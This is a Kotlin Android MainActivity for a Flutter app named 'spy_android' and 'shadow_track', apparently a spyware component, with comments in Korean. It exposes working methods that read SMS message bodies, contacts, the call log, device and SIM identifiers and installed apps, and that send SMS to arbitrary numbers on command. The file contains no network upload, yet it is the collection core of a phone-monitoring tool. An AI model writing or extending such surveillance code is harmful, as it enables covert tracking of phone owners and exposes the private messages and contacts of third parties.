package com.example.spy_android

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.provider.ContactsContract
import android.provider.CallLog
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import androidx.annotation.RequiresApi
import java.text.SimpleDateFormat
import java.util.*

class MainActivity: FlutterActivity() {
    private val CHANNEL = "shadow_track"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "initialize" -> {
                    initializeNativeServices()
                    result.success("Initialized")
                }
                "getBatteryLevel" -> {
                    val batteryLevel = getBatteryLevel()
                    result.success(batteryLevel)
                }
                "getNetworkType" -> {
                    val networkType = getNetworkType()
                    result.success(networkType)
                }
                "getInstalledApps" -> {
                    val apps = getInstalledApps()
                    result.success(apps)
                }
                "readSMS" -> {
                    val smsMessages = readSMS()
                    result.success(smsMessages)
                }
                "getContacts" -> {
                    val contacts = getContacts()
                    result.success(contacts)
                }
                "getCallLog" -> {
                    val callLog = getCallLog()
                    result.success(callLog)
                }
                "getDeviceInfo" -> {
                    val deviceInfo = getDeviceInfo()
                    result.success(deviceInfo)
                }
                "sendSMS" -> {
                    val phoneNumber = call.argument<String>("phoneNumber")
                    val message = call.argument<String>("message")
                    if (phoneNumber != null && message != null) {
                        val success = sendSMS(phoneNumber, message)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Phone number and message required", null)
                    }
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
    }

    private fun initializeNativeServices() {
        // 네이티브 서비스 초기화
        println("Shadow Track Native Services Initialized")
    }

    private fun getBatteryLevel(): Int {
        val batteryIntent = applicationContext.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1

        return if (level == -1 || scale == -1) -1 else (level * 100 / scale)
    }

    private fun getNetworkType(): String {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)

            when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile Data"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "Unknown"
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            networkInfo?.typeName ?: "Unknown"
        }
    }

    private fun getInstalledApps(): List<Map<String, Any>> {
        val packageManager = packageManager
        val packages = packageManager.getInstalledPackages(PackageManager.GET_META_DATA)
        val apps = mutableListOf<Map<String, Any>>()

        for (packageInfo in packages) {
            try {
                val appInfo = mapOf(
                    "packageName" to packageInfo.packageName,
                    "appName" to packageManager.getApplicationLabel(packageInfo.applicationInfo).toString(),
                    "versionName" to (packageInfo.versionName ?: "Unknown"),
                    "versionCode" to packageInfo.versionCode,
                    "installTime" to packageInfo.firstInstallTime,
                    "updateTime" to packageInfo.lastUpdateTime
                )
                apps.add(appInfo)
            } catch (e: Exception) {
                // 일부 시스템 앱에서 오류가 발생할 수 있음
                continue
            }
        }

        return apps
    }

    private fun readSMS(): List<Map<String, Any>> {
        val smsMessages = mutableListOf<Map<String, Any>>()

        try {
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/"),
                arrayOf("_id", "address", "body", "date", "type", "read"),
                null,
                null,
                "date DESC LIMIT 100"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex("_id")
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val typeIndex = it.getColumnIndex("type")
                val readIndex = it.getColumnIndex("read")

                while (it.moveToNext()) {
                    val smsData = mapOf(
                        "id" to it.getLong(idIndex),
                        "address" to it.getString(addressIndex),
                        "body" to it.getString(bodyIndex),
                        "date" to it.getLong(dateIndex),
                        "type" to it.getInt(typeIndex), // 1=받은 메시지, 2=보낸 메시지
                        "isRead" to (it.getInt(readIndex) == 1),
                        "timestamp" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(Date(it.getLong(dateIndex)))
                    )
                    smsMessages.add(smsData)
                }
            }
        } catch (e: SecurityException) {
            println("SMS 읽기 권한이 없습니다: ${e.message}")
        } catch (e: Exception) {
            println("SMS 읽기 오류: ${e.message}")
        }

        return smsMessages
    }

    private fun getContacts(): List<Map<String, Any>> {
        val contacts = mutableListOf<Map<String, Any>>()

        try {
            val cursor: Cursor? = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val typeIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)

                while (it.moveToNext()) {
                    val contactData = mapOf(
                        "name" to it.getString(nameIndex),
                        "phoneNumber" to it.getString(numberIndex),
                        "phoneType" to it.getInt(typeIndex),
                        "timestamp" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(Date())
                    )
                    contacts.add(contactData)
                }
            }
        } catch (e: SecurityException) {
            println("연락처 읽기 권한이 없습니다: ${e.message}")
        } catch (e: Exception) {
            println("연락처 읽기 오류: ${e.message}")
        }

        return contacts
    }

    private fun getCallLog(): List<Map<String, Any>> {
        val callLogs = mutableListOf<Map<String, Any>>()

        try {
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                ),
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
            )

            cursor?.use {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)

                while (it.moveToNext()) {
                    val callType = when (it.getInt(typeIndex)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else -> "Unknown"
                    }

                    val callData = mapOf(
                        "phoneNumber" to it.getString(numberIndex),
                        "contactName" to (it.getString(nameIndex) ?: "Unknown"),
                        "date" to it.getLong(dateIndex),
                        "duration" to it.getLong(durationIndex),
                        "callType" to callType,
                        "timestamp" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(Date(it.getLong(dateIndex)))
                    )
                    callLogs.add(callData)
                }
            }
        } catch (e: SecurityException) {
            println("통화 기록 읽기 권한이 없습니다: ${e.message}")
        } catch (e: Exception) {
            println("통화 기록 읽기 오류: ${e.message}")
        }

        return callLogs
    }

    private fun getDeviceInfo(): Map<String, Any> {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        return try {
            mapOf(
                "deviceId" to (telephonyManager.deviceId ?: "Unknown"),
                "simSerialNumber" to (telephonyManager.simSerialNumber ?: "Unknown"),
                "phoneNumber" to (telephonyManager.line1Number ?: "Unknown"),
                "networkOperatorName" to (telephonyManager.networkOperatorName ?: "Unknown"),
                "simOperatorName" to (telephonyManager.simOperatorName ?: "Unknown"),
                "networkType" to telephonyManager.networkType,
                "phoneType" to telephonyManager.phoneType,
                "hasIccCard" to telephonyManager.hasIccCard(),
                "isNetworkRoaming" to telephonyManager.isNetworkRoaming
            )
        } catch (e: SecurityException) {
            mapOf("error" to "권한이 없습니다: ${e.message}")
        } catch (e: Exception) {
            mapOf("error" to "디바이스 정보 수집 오류: ${e.message}")
        }
    }

    private fun sendSMS(phoneNumber: String, message: String): Boolean {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            true
        } catch (e: SecurityException) {
            println("SMS 전송 권한이 없습니다: ${e.message}")
            false
        } catch (e: Exception) {
            println("SMS 전송 오류: ${e.message}")
            false
        }
    }
}